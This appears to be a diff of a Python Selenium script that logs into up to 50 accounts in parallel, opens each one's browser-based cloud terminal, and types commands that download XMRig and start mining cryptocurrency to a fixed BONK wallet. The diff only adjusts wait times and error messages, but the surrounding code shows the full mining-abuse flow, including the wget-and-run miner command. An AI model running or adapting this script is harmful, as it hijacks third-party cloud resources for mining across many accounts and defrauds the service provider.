@@ -67,7 +67,7 @@ def open_browser(instance_number, email, password):
     original_window = driver.current_window_handle
 
 # Wait for new window/tab to open
-    WebDriverWait(driver, 20).until(EC.number_of_windows_to_be(2))
+    WebDriverWait(driver, 50).until(EC.number_of_windows_to_be(2))
 
 # Switch to the new window
     for handle in driver.window_handles:
@@ -85,7 +85,7 @@ def open_browser(instance_number, email, password):
         textarea.click()
         print("✅ Command executed.")
     except:
-        print(f"[{email}] ❌ button not found ")
+        print(f"[{email}] ❌ area not found ")
     
     try:
         textarea1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-helper-textarea")))
@@ -93,7 +93,7 @@ def open_browser(instance_number, email, password):
         textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BONK:mA914pP63TTdq1c8igHEtrKQyhdwz36yVVbQeAR6YnD.{email}#u7pd-53qq -p x --tls --threads=4 -k")
         textarea1.send_keys(Keys.ENTER)
     except:
-        print(f"[{email}] ❌ button 2727 not found ")
+        print(f"[{email}] ❌ terminal not found ")
 
 # Launch multiple instances
 threads = []
@@ -101,7 +101,7 @@ for i, (email, password) in enumerate(accounts[:50]):
     thread = threading.Thread(target=open_browser, args=(i, email, password))
     thread.start()
     threads.append(thread)
-    time.sleep(30)  # Prevent overload
+    time.sleep(60)  # Prevent overload
 
 for thread in threads:
     thread.join()
